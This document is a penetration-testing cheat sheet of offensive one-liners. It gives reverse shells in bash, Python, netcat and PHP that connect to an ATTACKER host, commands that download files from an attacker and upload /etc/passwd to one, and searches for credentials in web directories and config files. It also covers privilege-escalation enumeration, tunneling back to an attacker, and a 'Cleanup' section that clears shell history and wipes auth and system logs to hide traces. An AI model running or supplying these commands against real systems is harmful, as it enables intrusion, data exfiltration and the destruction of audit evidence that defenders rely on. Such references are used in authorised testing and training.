# Useful One-Liners

## Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# Netcat
nc -e /bin/sh ATTACKER 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
# PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## File Operations
```bash
# Download file
wget http://attacker/file -O /tmp/file
curl http://attacker/file -o /tmp/file
# Upload file
curl -F "file=@/etc/passwd" http://attacker/upload
# Base64 encode/decode
base64 file > file.b64
base64 -d file.b64 > file
```

## Enumeration
```bash
# System info
uname -a && cat /etc/os-release && id && whoami
# Network
ip addr || ifconfig
# Processes
ps aux
# SUID
find / -perm -4000 -type f 2>/dev/null
# Writable
find / -writable -type f 2>/dev/null
# Crontabs
cat /etc/crontab
ls -la /etc/cron*
```

## Privilege Escalation
```bash
# sudo -l
sudo -l
# find SUID
find / -perm -4000 -type f 2>/dev/null
# Capabilities
getcap -r / 2>/dev/null
# Kernel version
uname -r
```

## Web
```bash
# Directory bruteforce
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt
# Subdomain enum
subfinder -d target.com -silent | httpx -silent
# Port scan
nmap -sV -sC target
```

## Credential Hunting
```bash
# Search for passwords
grep -r "password\|passwd\|pwd" /var/www/ 2>/dev/null
grep -r "api_key\|apikey\|secret" /var/www/ 2>/dev/null
# Config files
find / -name "*.conf" -o -name "*.config" -o -name "*.env" 2>/dev/null
```

## Tunneling
```bash
# SSH port forward
ssh -L 8080:localhost:80 user@target
# SSH dynamic proxy
ssh -D 1080 user@target
# Chisel
./chisel server -p 8080 --reverse
./chisel client ATTACKER:8080 R:socks
```

## Encoding
```bash
# URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('payload'))"
# Base64
echo -n "payload" | base64
echo "cGF5bG9hZA==" | base64 -d
# Hex
echo -n "payload" | xxd
echo "7061796c6f6164" | xxd -r -p
```

## Cleanup
```bash
# Remove traces
history -c
cat /dev/null > ~/.bash_history
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
```
